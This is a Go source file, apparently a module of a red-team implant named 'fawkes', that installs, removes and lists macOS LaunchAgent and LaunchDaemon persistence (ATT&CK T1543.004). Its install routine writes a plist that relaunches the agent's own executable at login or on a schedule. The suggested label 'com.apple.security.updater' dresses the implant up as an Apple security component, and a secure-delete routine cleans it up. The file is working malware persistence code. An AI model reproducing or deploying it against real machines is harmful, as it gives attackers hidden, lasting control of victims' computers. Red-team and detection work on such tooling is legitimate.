//go:build darwin

package commands

import (
	"fmt"
	"os"
	"os/user"
	"path/filepath"
	"strings"

	"fawkes/pkg/structs"
)

type LaunchAgentCommand struct{}

func (c *LaunchAgentCommand) Name() string {
	return "launchagent"
}

func (c *LaunchAgentCommand) Description() string {
	return "Install, remove, or list macOS LaunchAgent/LaunchDaemon persistence (T1543.004)"
}

type launchAgentArgs struct {
	Action   string `json:"action"`
	Label    string `json:"label"`
	Path     string `json:"path"`
	Args     string `json:"args"`
	RunAt    string `json:"run_at"`
	Interval int    `json:"interval"`
	Daemon   bool   `json:"daemon"`
}

func (c *LaunchAgentCommand) Execute(task structs.Task) structs.CommandResult {
	if task.Params == "" {
		return errorResult("Error: parameters required. Use action: install, remove, list")
	}

	args, parseErr := unmarshalParams[launchAgentArgs](task)
	if parseErr != nil {
		return *parseErr
	}

	switch strings.ToLower(args.Action) {
	case "install":
		return launchAgentInstall(args)
	case "remove":
		return launchAgentRemove(args)
	case "list":
		return launchAgentList(args)
	default:
		return errorf("Unknown action: %s. Use: install, remove, list", args.Action)
	}
}

// getPlistDir returns the appropriate LaunchAgent or LaunchDaemon directory
func getPlistDir(daemon bool) (string, error) {
	if daemon {
		// System-wide LaunchDaemon — requires root
		return "/Library/LaunchDaemons", nil
	}
	// User-level LaunchAgent
	u, err := user.Current()
	if err != nil {
		return "", fmt.Errorf("cannot determine current user: %w", err)
	}
	return filepath.Join(u.HomeDir, "Library", "LaunchAgents"), nil
}

// launchAgentInstall creates a LaunchAgent or LaunchDaemon plist
func launchAgentInstall(args launchAgentArgs) structs.CommandResult {
	if args.Label == "" {
		return errorResult("Error: label is required (e.g., com.apple.security.updater)")
	}

	// Default to current executable if no path specified
	programPath := args.Path
	if programPath == "" {
		exe, err := os.Executable()
		if err != nil {
			return errorf("Error getting executable path: %v", err)
		}
		programPath = exe
	}

	plistDir, err := getPlistDir(args.Daemon)
	if err != nil {
		return errorf("Error: %v", err)
	}

	// Ensure the directory exists
	if err := os.MkdirAll(plistDir, 0755); err != nil {
		return errorf("Error creating directory %s: %v", plistDir, err)
	}

	plistPath := filepath.Join(plistDir, args.Label+".plist")

	// Build program arguments array
	var programArgs []string
	programArgs = append(programArgs, programPath)
	if args.Args != "" {
		programArgs = append(programArgs, strings.Fields(args.Args)...)
	}

	// Build the plist XML
	plist := macBuildPlist(args.Label, programArgs, args.RunAt, args.Interval)

	if err := os.WriteFile(plistPath, []byte(plist), 0644); err != nil {
		return errorf("Error writing plist: %v", err)
	}

	// Determine type description
	plistType := "LaunchAgent"
	if args.Daemon {
		plistType = "LaunchDaemon"
	}

	triggerDesc := "RunAtLoad (on login)"
	if args.Interval > 0 {
		triggerDesc += fmt.Sprintf(" + every %ds", args.Interval)
	}
	if args.RunAt != "" {
		triggerDesc = fmt.Sprintf("Calendar: %s", args.RunAt)
	}

	return successf("Installed %s persistence:\n  Label:   %s\n  Path:    %s\n  Plist:   %s\n  Trigger: %s",
		plistType, args.Label, programPath, plistPath, triggerDesc)
}

// launchAgentRemove removes a LaunchAgent or LaunchDaemon plist
func launchAgentRemove(args launchAgentArgs) structs.CommandResult {
	if args.Label == "" {
		return errorResult("Error: label is required to identify the plist to remove")
	}

	plistDir, err := getPlistDir(args.Daemon)
	if err != nil {
		return errorf("Error: %v", err)
	}

	plistPath := filepath.Join(plistDir, args.Label+".plist")
	secureRemove(plistPath)
	if _, err := os.Stat(plistPath); err == nil {
		return errorf("Error removing %s: file still exists", plistPath)
	}

	plistType := "LaunchAgent"
	if args.Daemon {
		plistType = "LaunchDaemon"
	}

	return successf("Removed %s: %s\nNote: Run 'launchctl remove %s' to unload if currently loaded", plistType, plistPath, args.Label)
}

// launchAgentList enumerates LaunchAgent and LaunchDaemon plists
func launchAgentList(args launchAgentArgs) structs.CommandResult {
	var lines []string
	lines = append(lines, "=== macOS Persistence ===\n")

	// List user LaunchAgents
	userDir, err := getPlistDir(false)
	if err == nil {
		lines = append(lines, fmt.Sprintf("--- User LaunchAgents: %s ---", userDir))
		lines = append(lines, listPlistDir(userDir)...)
		lines = append(lines, "")
	}

	// List system LaunchAgents
	lines = append(lines, "--- System LaunchAgents: /Library/LaunchAgents ---")
	lines = append(lines, listPlistDir("/Library/LaunchAgents")...)
	lines = append(lines, "")

	// List LaunchDaemons
	lines = append(lines, "--- LaunchDaemons: /Library/LaunchDaemons ---")
	lines = append(lines, listPlistDir("/Library/LaunchDaemons")...)

	return successResult(strings.Join(lines, "\n"))
}

// listPlistDir reads a directory and returns formatted plist entries
func listPlistDir(dir string) []string {
	entries, err := os.ReadDir(dir)
	if err != nil {
		return []string{fmt.Sprintf("  Error: %v", err)}
	}

	if len(entries) == 0 {
		return []string{"  (empty)"}
	}

	var lines []string
	for _, e := range entries {
		if !strings.HasSuffix(e.Name(), ".plist") {
			continue
		}
		info, _ := e.Info()
		size := int64(0)
		if info != nil {
			size = info.Size()
		}
		label := strings.TrimSuffix(e.Name(), ".plist")
		lines = append(lines, fmt.Sprintf("  %s (%d bytes)", label, size))
	}

	if len(lines) == 0 {
		return []string{"  (no plist files)"}
	}
	return lines
}
